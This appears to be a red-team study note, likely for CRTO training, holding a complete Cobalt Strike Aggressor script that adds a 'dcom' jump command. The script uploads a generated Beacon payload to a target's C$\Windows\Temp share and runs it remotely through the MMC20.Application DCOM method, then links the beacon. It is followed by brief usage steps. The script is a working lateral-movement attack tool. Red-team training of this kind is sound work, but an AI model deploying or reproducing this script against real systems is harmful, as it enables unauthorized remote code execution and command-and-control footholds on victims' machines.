
Sample script of the Jump command integrating the usage of Powershell script `Invoke-DCOM.ps1`

Walkthrough of build this script: 
[[Jump + Invoke-DCOM Walkthrough]]

#### 🖊️ Script contents

```
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command1
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");

    # read in the script
    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
    $script = readb($handle, -1);
    closef($handle);

    # host the script in Beacon
    $oneliner = beacon_host_script($1, $script);

    # generate stageless payload
    $payload = artifact_payload($3, "exe", "x64");

    # upload to the target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);

    # run via powerpick
    bpowerpick!($1, "Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

    # link if p2p beacon
    beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);

```


#### 📔 Script Usage

1) Make sure to load the script via the Script Manger (_Cobalt Strike > Script Manager_).
2) The target machine will link when you run the new command

![[dcom.png]]



#### ⚠ Opsec




### Properties
---
📆 created   {{06-03-2024}} 15:18
🏷️ tags: #redteam #crto 

---

